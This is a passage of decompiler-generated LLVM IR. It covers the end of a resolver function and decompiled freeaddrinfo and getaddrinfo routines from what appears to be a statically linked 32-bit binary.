  br i1 %v1_805e91e, label %dec_label_pc_805e7c7, label %dec_label_pc_805e91c.dec_label_pc_805e924_crit_edge

dec_label_pc_805e91c.dec_label_pc_805e924_crit_edge: ; preds = %dec_label_pc_805e906
  %v0_805e924.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805e924

dec_label_pc_805e924:                             ; preds = %dec_label_pc_805e91c.dec_label_pc_805e924_crit_edge, %dec_label_pc_805e7bf
  %v0_805e924 = phi i32 [ %v0_805e924.pre, %dec_label_pc_805e91c.dec_label_pc_805e924_crit_edge ], [ %v0_805e786, %dec_label_pc_805e7bf ]
  %stack_var_16.0.lcssa = phi i32 [ %v1_805e914, %dec_label_pc_805e91c.dec_label_pc_805e924_crit_edge ], [ %stack_var_16.149, %dec_label_pc_805e7bf ]
  %v1_805e924 = inttoptr i32 %v0_805e924 to i32*
  %v2_805e924 = load i32, i32* %v1_805e924, align 4
  store i32 %v2_805e924, i32* @edi, align 4
  %v1_805e926 = icmp eq i32 %v2_805e924, 0
  %v1_805e928 = icmp eq i1 %v1_805e926, false
  br i1 %v1_805e928, label %dec_label_pc_805e6b0, label %dec_label_pc_805e95e

dec_label_pc_805e930:                             ; preds = %dec_label_pc_805e16f, %dec_label_pc_805e083, %dec_label_pc_805e0a7
  store i32 264, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e960

dec_label_pc_805e937:                             ; preds = %dec_label_pc_805e335, %dec_label_pc_805e2a9
  store i32 6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e960

dec_label_pc_805e93e:                             ; preds = %dec_label_pc_805e761, %dec_label_pc_805e5d9, %dec_label_pc_805e38b
  store i32 258, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e960

dec_label_pc_805e945:                             ; preds = %dec_label_pc_805e72c, %dec_label_pc_805e52a, %dec_label_pc_805e420
  %v0_805e945 = call i32 @__GI___h_errno_location()
  %v1_805e94a = inttoptr i32 %v0_805e945 to i32*
  store i32 -1, i32* %v1_805e94a, align 4
  store i32 11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e960

dec_label_pc_805e957:                             ; preds = %dec_label_pc_805e7c7
  store i32 10, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e960

dec_label_pc_805e95e:                             ; preds = %dec_label_pc_805e924, %dec_label_pc_805e69e, %dec_label_pc_805e694
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e960

dec_label_pc_805e960:                             ; preds = %dec_label_pc_805e14e, %dec_label_pc_805e0c1, %dec_label_pc_805e5c1, %dec_label_pc_805e083, %dec_label_pc_805e957, %dec_label_pc_805e945, %dec_label_pc_805e93e, %dec_label_pc_805e937, %dec_label_pc_805e930, %dec_label_pc_805e5cf, %dec_label_pc_805e95e
  %v0_805e967 = phi i32 [ %v2_805e0d9, %dec_label_pc_805e0c1 ], [ 3, %dec_label_pc_805e5c1 ], [ 263, %dec_label_pc_805e083 ], [ 10, %dec_label_pc_805e957 ], [ 11, %dec_label_pc_805e945 ], [ 258, %dec_label_pc_805e93e ], [ 6, %dec_label_pc_805e937 ], [ 264, %dec_label_pc_805e930 ], [ 259, %dec_label_pc_805e5cf ], [ 0, %dec_label_pc_805e95e ], [ %v2_805e142, %dec_label_pc_805e14e ]
  store i32 %v0_805dfd4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805e967

; uselistorder directives
  uselistorder i32 %v2_805e924, { 1, 2, 0 }
  uselistorder i32 %v1_805e914, { 0, 2, 1 }
  uselistorder i32 %v2_805e8d4, { 2, 1, 0, 3 }
  uselistorder i32* %v2_805e7ea, { 5, 0, 1, 4, 3, 2, 6 }
  uselistorder i32 %v2_805e7db, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_16.039, { 7, 8, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i16* %v4_805e8ab, { 1, 0 }
  uselistorder i32 %v1_805e7db18, { 2, 3, 4, 5, 0, 1 }
  uselistorder i16 %storemerge12, { 2, 0, 1 }
  uselistorder i32 %storemerge16, { 1, 3, 2, 4, 0 }
  uselistorder i32 %stack_var_-144.0, { 1, 0 }
  uselistorder i8* %v3_805e771, { 1, 0 }
  uselistorder i32 %v2_805e70f, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805e6e2, { 7, 6, 5, 4, 3, 2, 1, 0, 8 }
  uselistorder i32 %v2_805e6d2, { 1, 0 }
  uselistorder i1 %v4_805e78c, { 1, 0 }
  uselistorder i32 %v2_805e598, { 1, 0 }
  uselistorder i32 %v3_805e51e, { 1, 0 }
  uselistorder i32 %v0_805e511, { 1, 0, 2 }
  uselistorder i32 %v2_805e4ec, { 1, 0 }
  uselistorder i32 %v3_805e4ba, { 1, 0, 2 }
  uselistorder i32 %v0_805e4a5.pre, { 1, 0 }
  uselistorder i32 %v2_805e49d, { 1, 0 }
  uselistorder i32 %v2_805e42f, { 1, 0, 2 }
  uselistorder i32 %v3_805e414, { 1, 0 }
  uselistorder i32 %v0_805e407, { 1, 0, 2 }
  uselistorder i32 %v2_805e3e2, { 1, 0 }
  uselistorder i32 %v1_805e352, { 1, 0, 2 }
  uselistorder i1 %v2_805e307, { 1, 0 }
  uselistorder i32 %v4_805e2ff, { 1, 2, 0, 5, 3, 4, 6 }
  uselistorder i32 %v5_805e2f3, { 1, 0, 2 }
  uselistorder i32 %v3_805e2d3, { 1, 0 }
  uselistorder i32 %v4_805e289, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_805e285, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v8_805e261, { 1, 0 }
  uselistorder i32 %v1_805e239, { 1, 0 }
  uselistorder i32 %v0_805e239200, { 0, 3, 1, 2 }
  uselistorder i32 %v8_805e1de, { 1, 0, 2, 3 }
  uselistorder i32 %v8_805e187, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805e166, { 1, 0 }
  uselistorder i32 %stack_var_-156.160, { 5, 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_805e1ea, { 0, 2, 1, 3, 5, 4, 6, 7, 8 }
  uselistorder i32 %v3_805e05a, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v0_805e047208, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %v2_805e05a.pre-phi, { 1, 0 }
  uselistorder i1 %v1_805e031, { 1, 2, 0 }
  uselistorder i32 %stack_var_-160.0, { 2, 1, 0 }
  uselistorder i32 %v1_805e011, { 1, 0 }
  uselistorder i32* %v2_805dfee, { 5, 6, 0, 4, 1, 3, 2, 7 }
  uselistorder i32* %stack_var_-192, { 3, 0, 6, 4, 7, 5, 8, 2, 9, 1, 10 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i8** %stack_var_-268, { 3, 2, 4, 5, 9, 8, 7, 6, 0, 1 }
  uselistorder i8** %stack_var_-32, { 12, 11, 5, 0, 10, 9, 4, 1, 8, 7, 3, 6, 2 }
  uselistorder i32* %stack_var_-24, { 0, 1, 2, 3, 4, 5, 6, 7, 20, 21, 22, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-28, { 2, 3, 6, 0, 4, 7, 1, 5, 8 }
  uselistorder i8** %stack_var_4, { 5, 4, 3, 0, 2, 1, 6 }
  uselistorder i8** %stack_var_-152, { 4, 3, 5, 2, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 51, 52, 20, 21, 22, 23, 24, 25, 53, 54, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 55, 49, 50 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 19, 20, 29, 15, 16, 17, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 54, 53, 73, 65, 66, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 141, 140, 67, 68, 69, 70, 71, 72, 84, 85, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 143, 142, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 51, 113, 114, 115, 116, 117, 118, 121, 119, 120, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139 }
  uselistorder i32 264, { 1, 3, 0, 2 }
  uselistorder i32 -33, { 1, 0 }
  uselistorder i32 ()* @gethostbyname2_r, { 1, 0 }
  uselistorder i8 -1, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i8* inttoptr (i32 2 to i8*), { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 20, 21, 19, 13, 14, 15, 16, 17, 18, 22, 23, 24, 25, 5, 6, 7, 8, 9, 10, 12, 11, 26, 27, 28, 0, 3, 4, 1, 2, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 %arg2, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_805e960, { 10, 4, 5, 6, 7, 8, 9, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805e930, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805e906, { 1, 0 }
  uselistorder label %dec_label_pc_805e8ca, { 1, 0 }
  uselistorder label %dec_label_pc_805e885, { 1, 0 }
  uselistorder label %dec_label_pc_805e7c7, { 1, 0 }
  uselistorder label %dec_label_pc_805e786, { 1, 0 }
  uselistorder label %dec_label_pc_805e761, { 1, 0 }
  uselistorder label %dec_label_pc_805e6b0, { 1, 0 }
  uselistorder label %dec_label_pc_805e694, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e66f, { 1, 0 }
  uselistorder label %dec_label_pc_805e66a, { 1, 0 }
  uselistorder label %dec_label_pc_805e632, { 1, 0 }
  uselistorder label %dec_label_pc_805e5d9, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder label %dec_label_pc_805e5b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805e56f, { 1, 0 }
  uselistorder label %dec_label_pc_805e557, { 1, 0 }
  uselistorder label %dec_label_pc_805e52a, { 1, 0 }
  uselistorder label %dec_label_pc_805e4b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e4b5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805e474, { 1, 0 }
  uselistorder label %dec_label_pc_805e45c, { 1, 0 }
  uselistorder label %dec_label_pc_805e420, { 1, 0 }
  uselistorder label %dec_label_pc_805e310, { 1, 0 }
  uselistorder label %dec_label_pc_805e2c0, { 1, 0 }
  uselistorder label %dec_label_pc_805e250, { 1, 0, 4, 5, 2, 3 }
  uselistorder label %dec_label_pc_805e21f, { 1, 0 }
  uselistorder label %dec_label_pc_805e208, { 1, 0 }
  uselistorder label %dec_label_pc_805e1b1, { 1, 0 }
  uselistorder label %dec_label_pc_805e166, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805e0fc, { 1, 0 }
  uselistorder label %dec_label_pc_805e09f, { 1, 0 }
  uselistorder label %dec_label_pc_805e057, { 1, 0 }
  uselistorder label %dec_label_pc_805e04a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805e01a, { 1, 0 }
}

define i32 @freeaddrinfo(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp17, i32* %stack_var_-12, align 4
  %v1_805e9831 = icmp eq i32 %arg1, 0
  %v1_805e9858 = icmp eq i1 %v1_805e9831, false
  br i1 %v1_805e9858, label %dec_label_pc_805e972.lr.ph, label %dec_label_pc_805e987

dec_label_pc_805e972.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805e972

dec_label_pc_805e972:                             ; preds = %dec_label_pc_805e972.lr.ph, %dec_label_pc_805e972
  %v0_805e978 = phi i32 [ %arg1, %dec_label_pc_805e972.lr.ph ], [ %v0_805e981, %dec_label_pc_805e972 ]
  %v1_805e972 = add i32 %v0_805e978, 28
  %v2_805e972 = inttoptr i32 %v1_805e972 to i32*
  %v3_805e972 = load i32, i32* %v2_805e972, align 4
  store i32 %v3_805e972, i32* @ebx, align 4
  %v1_805e979 = call i32 @free(i32 %v0_805e978)
  %v0_805e981 = load i32, i32* @ebx, align 4
  %v1_805e983 = icmp eq i32 %v0_805e981, 0
  %v1_805e985 = icmp eq i1 %v1_805e983, false
  br i1 %v1_805e985, label %dec_label_pc_805e972, label %dec_label_pc_805e983.dec_label_pc_805e987_crit_edge

dec_label_pc_805e983.dec_label_pc_805e987_crit_edge: ; preds = %dec_label_pc_805e972
  %v2_805e987.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805e987

dec_label_pc_805e987:                             ; preds = %dec_label_pc_805e983.dec_label_pc_805e987_crit_edge, %entry
  %v2_805e987 = phi i32 [ %v2_805e987.pre, %dec_label_pc_805e983.dec_label_pc_805e987_crit_edge ], [ %tmp17, %entry ]
  ret i32 %v2_805e987

; uselistorder directives
  uselistorder i32 %v0_805e981, { 1, 0 }
  uselistorder label %dec_label_pc_805e972, { 1, 0 }
}

define i32 @getaddrinfo(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-24 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_805e98c = load i32, i32* @edi, align 4
  %v0_805e98d = load i32, i32* @esi, align 4
  %v0_805e98e = load i32, i32* @ebx, align 4
  %v4_805e992 = ptrtoint i8* %arg1 to i32
  %v5_805e992 = icmp eq i8* %arg1, null
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  br i1 %v5_805e992, label %dec_label_pc_805e9c4, label %dec_label_pc_805e9a9

dec_label_pc_805e9a9:                             ; preds = %entry
  store i32 %v4_805e992, i32* %eax.global-to-local, align 4
  %v2_805e9ad = load i8, i8* %arg1, align 1
  %v11_805e9ad = icmp eq i8 %v2_805e9ad, 42
  %v1_805e9b0 = icmp eq i1 %v11_805e9ad, false
  br i1 %v1_805e9b0, label %dec_label_pc_805e9c4, label %dec_label_pc_805e9b2

dec_label_pc_805e9b2:                             ; preds = %dec_label_pc_805e9a9
  %v1_805e9b2 = add i32 %v4_805e992, 1
  %v2_805e9b2 = inttoptr i32 %v1_805e9b2 to i8*
  %v3_805e9b2 = load i8, i8* %v2_805e9b2, align 1
  %v4_805e9b2 = icmp eq i8 %v3_805e9b2, 0
  %v1_805e9bb = icmp eq i1 %v4_805e9b2, false
  %v8_805e9bb = select i1 %v1_805e9bb, i32 %v4_805e992, i32 0
  store i32 %v8_805e9bb, i32* %eax.global-to-local, align 4
  %v5_805e9c0 = inttoptr i32 %v8_805e9bb to i8*
  br label %dec_label_pc_805e9c4

dec_label_pc_805e9c4:                             ; preds = %dec_label_pc_805e9a9, %entry, %dec_label_pc_805e9b2
  %v3_805ea0e = phi i8* [ %arg1, %dec_label_pc_805e9a9 ], [ null, %entry ], [ %v5_805e9c0, %dec_label_pc_805e9b2 ]
  %v1_805e9c4 = icmp eq i32 %arg2, 0
  br i1 %v1_805e9c4, label %dec_label_pc_805e9d9, label %dec_label_pc_805e9c8

dec_label_pc_805e9c8:                             ; preds = %dec_label_pc_805e9c4
  %v1_805e9c8 = inttoptr i32 %arg2 to i8*
  %v2_805e9c8 = load i8, i8* %v1_805e9c8, align 1
  %v11_805e9c8 = icmp eq i8 %v2_805e9c8, 42
  %v1_805e9cb = icmp eq i1 %v11_805e9c8, false
  br i1 %v1_805e9cb, label %dec_label_pc_805e9d9, label %dec_label_pc_805e9cd

dec_label_pc_805e9cd:                             ; preds = %dec_label_pc_805e9c8
  %v1_805e9cd = add i32 %arg2, 1
  %v2_805e9cd = inttoptr i32 %v1_805e9cd to i8*
  %v3_805e9cd = load i8, i8* %v2_805e9cd, align 1
  %v4_805e9cd = icmp eq i8 %v3_805e9cd, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_805e9d6 = select i1 %v4_805e9cd, i32 0, i32 %arg2
  store i32 %v3_805e9d6, i32* @esi, align 4
  br label %dec_label_pc_805e9d9

dec_label_pc_805e9d9:                             ; preds = %dec_label_pc_805e9c8, %dec_label_pc_805e9c4, %dec_label_pc_805e9cd
  %v1_805e9dd = phi i32 [ %arg2, %dec_label_pc_805e9c8 ], [ 0, %dec_label_pc_805e9c4 ], [ %v3_805e9d6, %dec_label_pc_805e9cd ]
  %v4_805e9d9 = ptrtoint i8* %v3_805ea0e to i32
  %v2_805e9dd = or i32 %v1_805e9dd, %v4_805e9d9
  %v3_805e9dd = icmp eq i32 %v2_805e9dd, 0
  br i1 %v3_805e9dd, label %dec_label_pc_805ec04, label %dec_label_pc_805e9e5

dec_label_pc_805e9e5:                             ; preds = %dec_label_pc_805e9d9
  %v1_805e9e5 = icmp eq i32 %arg3, 0
  %v1_805e9e7 = icmp eq i1 %v1_805e9e5, false
  br i1 %v1_805e9e7, label %dec_label_pc_805e9fd, label %dec_label_pc_805e9e9

dec_label_pc_805e9e9:                             ; preds = %dec_label_pc_805e9e5
  %v2_805e9ee = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_805e9ee, i32* @ebx, align 4
  %tmp121 = bitcast i32* %stack_var_-64 to i8*
  store i32 %v2_805e9ee, i32* @edi, align 4
  %v6_805e9f5 = call i32 @__GI_memset(i8* %tmp121, i32 0, i32 32)
  store i32 %v6_805e9f5, i32* %eax.global-to-local, align 4
  %v0_805e9fd.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805e9fd

dec_label_pc_805e9fd:                             ; preds = %dec_label_pc_805e9e5, %dec_label_pc_805e9e9
  %v0_805e9fd = phi i32 [ %arg3, %dec_label_pc_805e9e5 ], [ %v0_805e9fd.pre, %dec_label_pc_805e9e9 ]
  %v1_805e9fd = inttoptr i32 %v0_805e9fd to i32*
  %v2_805e9fd = load i32, i32* %v1_805e9fd, align 4
  store i32 %v2_805e9fd, i32* %eax.global-to-local, align 4
  %v1_805e9ff = and i32 %v2_805e9fd, -1088
  %v2_805e9ff = icmp eq i32 %v1_805e9ff, 0
  %v1_805ea04 = icmp eq i1 %v2_805e9ff, false
  br i1 %v1_805ea04, label %dec_label_pc_805ec0b, label %dec_label_pc_805ea0a

dec_label_pc_805ea0a:                             ; preds = %dec_label_pc_805e9fd
  %v2_805ea0a = and i32 %v2_805e9fd, 2
  %v3_805ea0a = icmp eq i32 %v2_805ea0a, 0
  br i1 %v3_805ea0a, label %dec_label_pc_805ea19, label %dec_label_pc_805ea0e

dec_label_pc_805ea0e:                             ; preds = %dec_label_pc_805ea0a
  %v5_805ea0e = icmp eq i8* %v3_805ea0e, null
  br i1 %v5_805ea0e, label %dec_label_pc_805ec0b, label %dec_label_pc_805ea19

dec_label_pc_805ea19:                             ; preds = %dec_label_pc_805ea0e, %dec_label_pc_805ea0a
  %v0_805ea19 = load i32, i32* @esi, align 4
  %v1_805ea19 = icmp eq i32 %v0_805ea19, 0
  br i1 %v1_805ea19, label %dec_label_pc_805ea8c, label %dec_label_pc_805ea1d

dec_label_pc_805ea1d:                             ; preds = %dec_label_pc_805ea19
  %v1_805ea1d = inttoptr i32 %v0_805ea19 to i8*
  %v2_805ea1d = load i8, i8* %v1_805ea1d, align 1
  %v3_805ea1d = icmp eq i8 %v2_805ea1d, 0
  br i1 %v3_805ea1d, label %dec_label_pc_805ea8c, label %dec_label_pc_805ea22

dec_label_pc_805ea22:                             ; preds = %dec_label_pc_805ea1d
  store i8* %v1_805ea1d, i8** %stack_var_-32, align 4
  %v2_805ea29 = ptrtoint i8** %stack_var_-24 to i32
  store i32 %v2_805ea29, i32* %eax.global-to-local, align 4
  %v6_805ea2f = ptrtoint i32* %stack_var_-64 to i32
  %v7_805ea2f = call i32 @strtoul(i32 %v0_805ea19, i32 %v2_805ea29, i32 10, i32 %v6_805ea2f)
  %v3_805ea3b = load i8*, i8** %stack_var_-24, align 4
  %v4_805ea3b = ptrtoint i8* %v3_805ea3b to i32
  store i32 %v4_805ea3b, i32* %eax.global-to-local, align 4
  %v2_805ea3f = load i8, i8* %v3_805ea3b, align 1
  %v3_805ea3f = icmp eq i8 %v2_805ea3f, 0
  %v0_805ea65 = load i32, i32* @edi, align 4
  br i1 %v3_805ea3f, label %dec_label_pc_805ea65, label %dec_label_pc_805ea44

dec_label_pc_805ea44:                             ; preds = %dec_label_pc_805ea22
  %v1_805ea44 = inttoptr i32 %v0_805ea65 to i32*
  %v2_805ea44 = load i32, i32* %v1_805ea44, align 4
  %v1_805ea46 = and i32 %v2_805ea44, 1024
  %v2_805ea46 = icmp eq i32 %v1_805ea46, 0
  store i32 %v1_805ea46, i32* %eax.global-to-local, align 4
  %v1_805ea4d = icmp eq i1 %v2_805ea46, false
  br i1 %v1_805ea4d, label %dec_label_pc_805ec04, label %dec_label_pc_805ea53

dec_label_pc_805ea53:                             ; preds = %dec_label_pc_805ea44
  %v2_805ea53 = ptrtoint i8** %stack_var_-32 to i32
  store i32 %v2_805ea53, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ea8c

dec_label_pc_805ea65:                             ; preds = %dec_label_pc_805ea22
  %v1_805ea65 = add i32 %v0_805ea65, 8
  %v2_805ea65 = inttoptr i32 %v1_805ea65 to i32*
  %v3_805ea65 = load i32, i32* %v2_805ea65, align 4
  %v4_805ea65 = icmp eq i32 %v3_805ea65, 0
  %v1_805ea69 = icmp eq i1 %v4_805ea65, false
  br i1 %v1_805ea69, label %dec_label_pc_805ea7a, label %dec_label_pc_805ea6b

dec_label_pc_805ea6b:                             ; preds = %dec_label_pc_805ea65
  %v1_805ea6b = add i32 %v0_805ea65, 12
  %v2_805ea6b = inttoptr i32 %v1_805ea6b to i32*
  %v3_805ea6b = load i32, i32* %v2_805ea6b, align 4
  %v4_805ea6b = icmp eq i32 %v3_805ea6b, 0
  store i32 -8, i32* %eax.global-to-local, align 4
  br i1 %v4_805ea6b, label %dec_label_pc_805ec0e, label %dec_label_pc_805ea7a

dec_label_pc_805ea7a:                             ; preds = %dec_label_pc_805ea6b, %dec_label_pc_805ea65
  br label %dec_label_pc_805ea8c

dec_label_pc_805ea8c:                             ; preds = %dec_label_pc_805ea19, %dec_label_pc_805ea1d, %dec_label_pc_805ea7a, %dec_label_pc_805ea53
  %v0_805eac5.pre95 = phi i32 [ %v0_805ea65, %dec_label_pc_805ea7a ], [ %v0_805ea65, %dec_label_pc_805ea53 ], [ %v0_805e9fd, %dec_label_pc_805ea1d ], [ %v0_805e9fd, %dec_label_pc_805ea19 ]
  %v4_805ea8c = icmp eq i32 %arg4, 0
  br i1 %v4_805ea8c, label %dec_label_pc_805eaa3, label %dec_label_pc_805ea9b

dec_label_pc_805ea9b:                             ; preds = %dec_label_pc_805ea8c
  %v2_805ea9b = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805ea9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eaa3

dec_label_pc_805eaa3:                             ; preds = %dec_label_pc_805ea8c, %dec_label_pc_805ea9b
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_805ea8c ], [ %v2_805ea9b, %dec_label_pc_805ea9b ]
  store i32 ptrtoint (i32* @global_var_806e4fc.667 to i32), i32* @ebp, align 4
  %v3_805ebb82555 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_806e4fc.667 to i32), i32 4) to i32*), align 4
  %v4_805ebb82656 = icmp eq i32 %v3_805ebb82555, 0
  %v1_805ebbc3363 = icmp eq i1 %v4_805ebb82656, false
  br i1 %v1_805ebbc3363, label %dec_label_pc_805eac5.lr.ph.lr.ph, label %dec_label_pc_805ebc2

dec_label_pc_805eac5.lr.ph.lr.ph:                 ; preds = %dec_label_pc_805eaa3
  br label %dec_label_pc_805eac5.lr.ph

dec_label_pc_805eac5:                             ; preds = %dec_label_pc_805eac5.lr.ph, %dec_label_pc_805eb75
  %v0_805eac8 = phi i32 [ %v0_805eac887, %dec_label_pc_805eac5.lr.ph ], [ %v0_805eb79, %dec_label_pc_805eb75 ]
  %stack_var_-80.235 = phi i32 [ %stack_var_-80.2.ph67, %dec_label_pc_805eac5.lr.ph ], [ %v0_805eb79, %dec_label_pc_805eb75 ]
  %v0_805ead7 = phi i32 [ %v0_805eac5.pre, %dec_label_pc_805eac5.lr.ph ], [ %v0_805eb6a, %dec_label_pc_805eb75 ]
  %stack_var_-88.034 = phi i32 [ %stack_var_-88.0.ph66, %dec_label_pc_805eac5.lr.ph ], [ %v0_805eb64, %dec_label_pc_805eb75 ]
  %v1_805eac5 = add i32 %v0_805ead7, 4
  %v2_805eac5 = inttoptr i32 %v1_805eac5 to i32*
  %v3_805eac5 = load i32, i32* %v2_805eac5, align 4
  store i32 %v3_805eac5, i32* %eax.global-to-local, align 4
  %v1_805eac8 = inttoptr i32 %v0_805eac8 to i32*
  %v2_805eac8 = load i32, i32* %v1_805eac8, align 4
  %v12_805eacb = icmp eq i32 %v3_805eac5, %v2_805eac8
  br i1 %v12_805eacb, label %dec_label_pc_805ead7, label %dec_label_pc_805eacf

dec_label_pc_805eacf:                             ; preds = %dec_label_pc_805eac5
  %v1_805eacf = icmp eq i32 %v3_805eac5, 0
  %v1_805ead1 = icmp eq i1 %v1_805eacf, false
  br i1 %v1_805ead1, label %dec_label_pc_805ebb5, label %dec_label_pc_805ead7

dec_label_pc_805ead7:                             ; preds = %dec_label_pc_805eacf, %dec_label_pc_805eac5
  %v1_805ead7 = inttoptr i32 %v0_805ead7 to i8*
  %v2_805ead7 = load i8, i8* %v1_805ead7, align 1
  %v3_805ead7 = and i8 %v2_805ead7, 32
  %v4_805ead7 = icmp eq i8 %v3_805ead7, 0
  br i1 %v4_805ead7, label %dec_label_pc_805eb3a, label %dec_label_pc_805eadc

dec_label_pc_805eadc:                             ; preds = %dec_label_pc_805ead7
  %v1_805eadc = urem i32 %v2_805eac8, 65536
  store i32 %v1_805eadc, i32* @esi, align 4
  %v1_805eadf = call i32 @__errno_location(i32 0)
  store i32 %v1_805eadf, i32* %eax.global-to-local, align 4
  %v0_805eae4 = load i32, i32* @esi, align 4
  %v1_805eae4 = trunc i32 %v0_805eae4 to i16
  %v10_805eae4 = icmp eq i16 %v1_805eae4, 2
  %v1_805eae8 = inttoptr i32 %v1_805eadf to i32*
  %v2_805eae8 = load i32, i32* %v1_805eae8, align 4
  store i32 %v1_805eadf, i32* @ebx, align 4
  br i1 %v10_805eae4, label %dec_label_pc_805eb2b, label %dec_label_pc_805eaf2

dec_label_pc_805eaf2:                             ; preds = %dec_label_pc_805eadc
  %v10_805eaf2 = icmp eq i16 %v1_805eae4, 10
  store i32 2, i32* %eax.global-to-local, align 4
  br i1 %v10_805eaf2, label %dec_label_pc_805eb30, label %dec_label_pc_805eafd

dec_label_pc_805eafd:                             ; preds = %dec_label_pc_805eaf2
  %v5_805eb03 = call i32 @socket(i32 %v0_805eae4, i32 2, i32 0)
  store i32 %v5_805eb03, i32* %eax.global-to-local, align 4
  %v2_805eb0b = icmp slt i32 %v5_805eb03, 0
  %v1_805eb0d = icmp eq i1 %v2_805eb0b, false
  br i1 %v1_805eb0d, label %dec_label_pc_805eb18, label %dec_label_pc_805eb0f

dec_label_pc_805eb0f:                             ; preds = %dec_label_pc_805eafd
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805eb11 = load i32, i32* @ebx, align 4
  %v1_805eb11 = inttoptr i32 %v0_805eb11 to i32*
  %v2_805eb11 = load i32, i32* %v1_805eb11, align 4
  %v11_805eb11 = icmp eq i32 %v2_805eb11, 24
  %v1_805eb14 = icmp eq i1 %v11_805eb11, false
  br i1 %v1_805eb14, label %dec_label_pc_805eb30, label %dec_label_pc_805eb2b

dec_label_pc_805eb18:                             ; preds = %dec_label_pc_805eafd
  %v2_805eb1c = call i32 @__libc_close(i32 %v5_805eb03)
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_805eb36.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805eb30

dec_label_pc_805eb2b:                             ; preds = %dec_label_pc_805eb0f, %dec_label_pc_805eadc
  %v1_805eb3689 = phi i32 [ %v0_805eb11, %dec_label_pc_805eb0f ], [ %v1_805eadf, %dec_label_pc_805eadc ]
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eb30

dec_label_pc_805eb30:                             ; preds = %dec_label_pc_805eb0f, %dec_label_pc_805eaf2, %dec_label_pc_805eb18, %dec_label_pc_805eb2b
  %v1_805eb36 = phi i32 [ %v0_805eb11, %dec_label_pc_805eb0f ], [ %v1_805eadf, %dec_label_pc_805eaf2 ], [ %v1_805eb36.pre, %dec_label_pc_805eb18 ], [ %v1_805eb3689, %dec_label_pc_805eb2b ]
  %v0_805eb34 = phi i1 [ true, %dec_label_pc_805eb0f ], [ false, %dec_label_pc_805eaf2 ], [ false, %dec_label_pc_805eb18 ], [ false, %dec_label_pc_805eb2b ]
  %v2_805eb36 = inttoptr i32 %v1_805eb36 to i32*
  store i32 %v2_805eae8, i32* %v2_805eb36, align 4
